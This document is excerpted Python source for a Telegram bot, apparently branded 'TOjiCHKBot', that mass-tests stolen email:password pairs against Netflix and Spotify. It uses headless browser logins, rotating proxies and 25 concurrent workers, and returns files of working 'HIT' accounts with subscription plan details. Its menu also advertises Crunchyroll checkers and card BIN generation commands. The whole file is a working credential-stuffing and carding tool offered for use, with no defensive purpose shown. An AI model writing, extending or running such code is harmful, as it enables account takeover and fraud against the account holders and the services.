...
from netflix import NetflixAutomation
sys.path.insert(0, 'acc gates/spotify')
from login_automation import SpotifyLoginAutomation
...
NET_WAITING_ACCOUNTS = 7
NET_GLOBAL_SETTINGS = {
    'proxy': None,
    'workers': 25
}

SP_WAITING_ACCOUNTS = 8
SP_GLOBAL_SETTINGS = {
    'proxy': None,
    'workers': 25
}
...
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if query.data == 'admin':
        ...
        await safe_edit_message(query, "╔═════════════════════════╗\n"
            ...
            "├ 🎵 Spotify: /sp, /msp, /asp ✅\n"
            "├ 🍿 Netflix: /nf, /mnf ✅\n"
            "├ 📺 Crunchyroll: /cr, /mcr, /acr ✅\n"
            "└ (Account checkers in /cmd) ✅\n\n"
            "━━━━━━━━━━━━━━━━━━━━━", reply_markup=reply_markup)
        ...
        await safe_edit_message(query, 
            ...
            "📝 Usage:\n"
            "`/net email:password`\n"
            "`/mnet` - Reply to file or send list\n"
            "`/pnet proxy` - Set proxy\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
        ...
        await safe_edit_message(query, 
            ...
            "📝 Usage:\n"
            "`/sp email:password`\n"
            "`/msp` - Reply to file or send list\n"
            "`/asp proxy` - Set proxy\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
...
async def gbin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    # Default quantity to 10 if not provided
    quantity = 10
    if context.args:
        try:
...
async def gbin_receive_digits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    # Format bins in monospace for easy copying
    bins_monospace = '\n'.join([f"`{bin_num}`" for bin_num in bins])
    ...
    try:
        ...
        if len(context.args) > 1:
            try:
                ...
                # Get first argument (BIN or partial card)
                first_arg = ' '.join(context.args[:-1])
            except ValueError:
                # Last arg is not a number, so it's part of the card/bin
                first_arg = ' '.join(context.args)
        else:
            # Only one argument - use it as BIN and default amount to 10
...
def parse_netflix_proxy(proxy_string):
    """Parse proxy from various formats for Netflix checker"""
    ...
    if len(parts) == 2:
        ...
        if part2.isdigit() and len(part2) <= 5:
            host, port, username, password = parts
        elif part4.isdigit() and len(part4) <= 5:
...
async def check_netflix(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single Netflix account check command /net"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    ...
    if not context.args:
        await update.message.reply_text(
            ...
            "Example: /net example@gmail.com:pass123"
        )
        return
    ...
    msg = await update.message.reply_text("⏳ Checking Netflix account...")
    
    try:
        proxy = None
        if NET_GLOBAL_SETTINGS['proxy']:
            proxy = parse_netflix_proxy(NET_GLOBAL_SETTINGS['proxy'])
        
        netflix = NetflixAutomation(debug=False, headless=True, proxy=proxy)
        result = await netflix.login(email.strip(), password.strip())
        
        elapsed = round(time.time() - start_time, 2)
        proxy_status = "🟢 Active" if NET_GLOBAL_SETTINGS['proxy'] else "🔴 None"
        
        if result.get('status') == 'success':
            response_text = (
                f"み ¡@𝐓𝐎𝐣𝐢𝐂𝐇𝐊𝐁𝐨𝐭 ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩\n"
                f"𝐍𝐄𝐓𝐅𝐋𝐈𝐗\n"
                f"━━━━━━━━━\n"
                f"𝐀𝐂𝐂 ➜ {email}:{password}\n"
                f"𝐒𝐓𝐀𝐓𝐔𝐒 ➜ ✅ HIT\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ Login Successful\n"
                f"━━━━━━━━━\n"
        ...
        await msg.edit_text(
            ...
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {str(e)[:50]}\n"
            f"━━━━━━━━━\n"
            f"𝗧/𝘁 : {elapsed}s | 𝐏𝐫𝐨𝐱𝐲 : {proxy_status if NET_GLOBAL_SETTINGS['proxy'] else '🔴 None'}\n"
            f"𝐑𝐄𝐐 : @{username}\n"
            f"𝐃𝐄𝐕 : @𝐌𝐔𝐌𝐈𝐑𝐔"
        )

async def set_netflix_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set proxy for Netflix checker /pnet"""
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    ...
    if not context.args:
        current = NET_GLOBAL_SETTINGS['proxy'] or "None"
        await update.message.reply_text(
            f"🎬 Netflix Proxy Settings\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Current: {current[:50]}...\n\n"
            f"Usage: /pnet <proxy>\n\n"
            f"📋 Supported formats:\n"
            ...
            f"• host:port\n\n"
            f"Example:\n"
            f"/pnet proxy.example.com:5959:user:pass\n\n"
            f"To remove proxy:\n"
            f"/pnet off"
        )
        return
    
    proxy_input = context.args[0]
    
    if proxy_input.lower() in ['off', 'none', 'remove', 'clear']:
        NET_GLOBAL_SETTINGS['proxy'] = None
        await update.message.reply_text("✅ Netflix proxy removed!")
        return
    
    parsed = parse_netflix_proxy(proxy_input)
    if parsed:
        NET_GLOBAL_SETTINGS['proxy'] = proxy_input
        await update.message.reply_text(
            f"✅ Netflix proxy set!\n"
            f"🔌 Server: {parsed.get('server')}\n"
            f"🔐 Auth: {'Yes' if parsed.get('username') else 'No'}"
        )
    else:
...
async def check_netflix_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Netflix account check entry point /mnet"""
    user_id = update.effective_user.id
...
async def mass_check_netflix_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if update.message.reply_to_message and update.message.reply_to_message.document:
        ...
        await update.message.reply_text("❌ No file found! Reply to a file with /mnet")
        return
    ...
    try:
        ...
        if len(accounts) > 5000 and not is_admin(user_id):
            await update.message.reply_text("❌ Max 5000 accounts for users!")
            return
...
async def receive_netflix_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive Netflix accounts for mass checking"""
    user_id = update.effective_user.id
...
async def process_netflix_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process Netflix accounts with 25 concurrent workers"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    accounts = context.user_data.get('accounts', [])
        ...
        async with semaphore:
            try:
                if ':' in account:
                    ...
                    errors.append(f"INVALID_FORMAT:{account}")
                    checked_count[0] += 1
                    return
                ...
                if result.get('status') == 'success':
                    ...
                    dead.append(f"{email}:{password} | {error_msg[:30]}")
                
                checked_count[0] += 1
            except Exception as e:
                errors.append(f"ERROR:{account}")
                checked_count[0] += 1
                logger.error(f"Netflix check error for {account}: {e}")
    ...
    try:
            ...
            if current_time - last_update_time[0] >= 2:
                try:
                    ...
                    await msg.edit_text(
                        ...
                        f"[{progress_bar}] {percentage}%\n"
                        f"🔄 {checked_count[0]}/{len(accounts)} checked\n\n"
                        f"✅ {len(hits)} • ❌ {len(dead)} • ⚡ {len(errors)}\n"
                        f"🔌 Proxy: {proxy_status}"
                    )
                    last_update_time[0] = current_time
                except Exception as e:
        ...
        total_checked = len(hits) + len(dead) + len(errors)
        
        final_msg = (
            f"み ¡@𝐓𝐎𝐣𝐢𝐂𝐇𝐊𝐁𝐨𝐭 ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩\n"
            f"𝐍𝐄𝐓𝐅𝐋𝐈𝐗 𝐌𝐀𝐒𝐒 𝐂𝐇𝐊\n"
            f"━━━━━━━━━\n"
            f"📊 Checked: {total_checked}/{len(accounts)}\n"
            f"[████████████████████] 100%\n\n"
            f"✅ HITS: {len(hits)}\n"
            f"❌ DEAD: {len(dead)}\n"
            f"⚡ ERRORS: {len(errors)}\n"
            f"━━━━━━━━━\n"
            f"𝐏𝐫𝐨𝐱𝐲 : {proxy_status}\n"
            f"𝐑𝐄𝐐 : @{username}\n"
            f"𝐃𝐄𝐕 : @𝐌𝐔𝐌𝐈𝐑𝐔"
        )
        ...
        if hits:
            ...
            await update.message.reply_document(
                document=hits_txt.encode(),
                filename=f"netflix_hits_{user_id}.txt",
                caption=f"✅ NETFLIX HITS ({len(hits)} accounts)"
            )
        
        if dead:
            dead_txt = '\n'.join(dead)
            await update.message.reply_document(
                document=dead_txt.encode(),
                filename=f"netflix_dead_{user_id}.txt",
                caption=f"❌ NETFLIX DEAD ({len(dead)} accounts)"
            )
        ...
        if errors:
            ...
            await update.message.reply_document(
                document=errors_txt.encode(),
                filename=f"netflix_errors_{user_id}.txt",
                caption=f"⚡ NETFLIX ERRORS ({len(errors)} accounts)"
            )
...
def parse_spotify_proxy(proxy_string):
    """Parse proxy string for Spotify automation"""
    if not proxy_string:
        return None
...
def run_spotify_check_sync(email, password, proxy_config):
    """Run Spotify check synchronously (for thread execution)"""
    spotify = SpotifyLoginAutomation(headless=True, slow_mo=200, proxy_config=proxy_config)
    try:
        spotify.start()
        result = spotify.spotify_login(email.strip(), password.strip())
        return result
    finally:
        spotify.stop()

async def check_spotify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single Spotify account check - /sp email:password"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    ...
    processing_msg = await update.message.reply_text("⏳ Checking Spotify account...")
    
    start_time = time.time()
    
    try:
        proxy = None
        if SP_GLOBAL_SETTINGS['proxy']:
            proxy = parse_spotify_proxy(SP_GLOBAL_SETTINGS['proxy'])
        
        proxy_status = "🟢 Active" if SP_GLOBAL_SETTINGS['proxy'] else "🔴 None"
        
        result = await asyncio.to_thread(run_spotify_check_sync, email, password, proxy)
...
𝐬𝐩𝐨𝐭𝐢𝐟𝐲
━━━━━━━━━
𝐚𝐜𝐜 ➜ <code>{email}:{password}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {plan} | {sub_status}
━━━━━━━━━
𝗧/𝘁 : {time_taken}s | 𝐏𝐫𝐨𝐱𝐲 : {proxy_status}
𝐑𝐄𝐐 : @{username}
𝐃𝐄𝐕 : @𝐌𝐔𝐌𝐈𝐑𝐔"""
        else:
            status = "❌ DEAD"
...
async def set_spotify_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set proxy for Spotify - /asp proxy"""
    user_id = update.effective_user.id
    ...
    if not context.args:
        current = SP_GLOBAL_SETTINGS['proxy'] or "None"
        await update.message.reply_text(
            f"🎵 𝗦𝗣𝗢𝗧𝗜𝗙𝗬 𝗣𝗥𝗢𝗫𝗬\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"🔌 Current: {current}\n\n"
            f"📝 Usage:\n"
            f"`/asp host:port` or\n"
            f"`/asp host:port:user:pass`\n\n"
            f"To clear: `/asp clear`"
        )
        return
    ...
    if proxy_input.lower() == 'clear':
        SP_GLOBAL_SETTINGS['proxy'] = None
        await update.message.reply_text("✅ Spotify proxy cleared!")
        return
    
    parsed = parse_spotify_proxy(proxy_input)
    if parsed:
        SP_GLOBAL_SETTINGS['proxy'] = proxy_input
        await update.message.reply_text(
            f"✅ Spotify proxy set!\n"
            f"🔌 Server: {parsed.get('server')}\n"
            f"🔐 Auth: {'Yes' if parsed.get('username') else 'No'}"
...
async def check_spotify_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Spotify account check entry point /msp"""
    user_id = update.effective_user.id
    ...
    await update.message.reply_text(
        ...
        "📋 Send accounts in format:\n"
        "`email:password` (one per line)\n\n"
        "Or reply to a file with /msp\n\n"
        "⚡ 25 concurrent workers\n"
        "📊 Max 5000 accounts"
    )
    return SP_WAITING_ACCOUNTS

async def mass_check_spotify_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle mass Spotify check from file reply"""
    user_id = update.effective_user.id
    ...
    if update.message.reply_to_message and update.message.reply_to_message.document:
        ...
        await update.message.reply_text("❌ No file found! Reply to a file with /msp")
        return
...
async def receive_spotify_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive Spotify accounts for mass checking"""
    user_id = update.effective_user.id
...
async def process_spotify_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process Spotify accounts with concurrent workers"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    accounts = context.user_data.get('accounts', [])
        ...
        async with semaphore:
            try:
                ...
                if result.get('success'):
                    ...
                    hits.append(f"{email}:{password}")
                    hits_detailed.append(f"{email}:{password} | Plan={plan} | Status={sub_status}")
                else:
                    error_msg = result.get('message', 'Unknown')
                    dead.append(f"{email}:{password} | {error_msg[:30]}")
                ...
                errors.append(f"ERROR:{account}")
                checked_count[0] += 1
                logger.error(f"Spotify check error for {account}: {e}")
    ...
    try:
        ...
        for i in range(0, len(accounts), batch_size):
            batch = accounts[i:i + batch_size]
            await asyncio.gather(*[check_single_account(acc) for acc in batch])
        ...
        if hits:
            ...
            await update.message.reply_document(
                document=hits_txt.encode(),
                filename=f"spotify_hits_{user_id}.txt",
                caption=f"✅ SPOTIFY HITS ({len(hits)} accounts)"
            )
            
            hits_detailed_txt = '\n'.join(hits_detailed)
            await update.message.reply_document(
                document=hits_detailed_txt.encode(),
                filename=f"spotify_hits_detailed_{user_id}.txt",
                caption=f"✅ SPOTIFY HITS DETAILED ({len(hits)} accounts)"
            )
        ...
        if dead:
            ...
            await update.message.reply_document(
                document=dead_txt.encode(),
                filename=f"spotify_dead_{user_id}.txt",
                caption=f"❌ SPOTIFY DEAD ({len(dead)} accounts)"
            )
        ...
        if errors:
            ...
            await update.message.reply_document(
                document=errors_txt.encode(),
                filename=f"spotify_errors_{user_id}.txt",
                caption=f"⚡ SPOTIFY ERRORS ({len(errors)} accounts)"
            )
...
def main():
    ...
    application.add_handler(CommandHandler("asp", set_spotify_proxy))
